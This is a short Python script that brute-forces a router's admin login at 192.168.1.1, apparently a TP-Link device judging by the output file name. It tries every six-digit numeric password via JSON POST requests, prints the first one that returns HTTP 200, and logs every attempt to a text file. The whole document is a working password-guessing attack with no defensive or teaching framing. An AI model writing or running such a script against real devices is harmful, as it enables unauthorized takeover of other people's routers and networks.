import requests
import json
import itertools

url = "http://192.168.1.1/"
pro = itertools.product("0123456789", repeat=6)
value = list(pro)
result = ""
for i in value:
    y = ""
    for x in range(len(i)):
        y += i[x]
    data = {"method": "do", "login": {"password": y}}
    res = requests.post(url=url, data=json.dumps(data))
    result += y + "            -" + str(res.status_code) + '\n'

    if res.status_code == 200:
        print(y)
        break

with open("TLPass.txt", 'w') as file:
    file.write(result)
